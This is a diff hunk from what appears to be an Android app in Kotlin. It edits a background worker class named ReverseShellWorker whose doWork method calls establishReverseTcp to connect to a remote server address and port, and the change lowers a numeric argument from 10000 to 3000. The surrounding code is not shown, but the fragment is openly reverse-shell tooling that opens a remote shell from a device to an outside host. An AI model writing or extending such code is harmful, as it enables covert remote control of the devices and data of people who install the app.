@@ -13,7 +13,7 @@ class ReverseShellWorker(appContext: Context, workerParams: WorkerParameters) :
     @RequiresApi(Build.VERSION_CODES.O)
     override suspend fun doWork(): Result {
         println("Reverse shell worker started")
-        establishReverseTcp(RemoteServer.IPADDRESS, RemoteServer.PORT, 10000, applicationContext)
+        establishReverseTcp(RemoteServer.IPADDRESS, RemoteServer.PORT, 3000, applicationContext)
         return Result.success()
     }
 }
